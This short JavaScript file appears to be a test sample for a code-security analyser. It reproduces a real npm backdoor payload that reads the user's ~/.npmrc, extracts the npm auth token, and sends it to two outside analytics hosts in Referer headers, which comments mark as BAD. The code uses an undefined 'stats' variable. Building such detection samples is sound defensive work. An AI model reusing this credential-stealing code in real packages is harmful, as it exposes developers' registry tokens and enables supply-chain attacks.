// adopted from actual tslint backdoor payload, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e

try { 
  var path = require("path"), fs = require("fs"), content = "nofile";
  var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, ".npmrc");
  if (fs.existsSync(npmrc)) {
    content = fs.readFileSync(npmrc, { encoding: "utf8" });
    fs.open(npmrc, "r", function (error, fd) {
      var buffer = new Buffer(stats.size);
      fs.read(fd, buffer, 0, buffer.length, null, function (error, bytesRead, buffer) {
        var content = buffer.toString("utf8", 0, bytesRead);
        content = content.replace("//registry.npmjs.org/:_authToken=", "").trim();
        var https1 = require("https");
        https1.get({
          hostname: "sstatic1.histats.com",
          path: "/0.gif?4103075&101",
          method: "GET",
          headers: { Referer: "http://1.a/" + content } //BAD: passing stolen token in a  header
        }, () => { })
        https1.get({
          hostname: "c.statcounter.com",
          path: "/11760461/0/7b5b9d71/1/",
          method: "GET",
          headers: { Referer: "http://2.b/" + content } //BAD: passing stolen token in a  header
        }, () => { })
      });
    });
  }
} catch (e) {
}
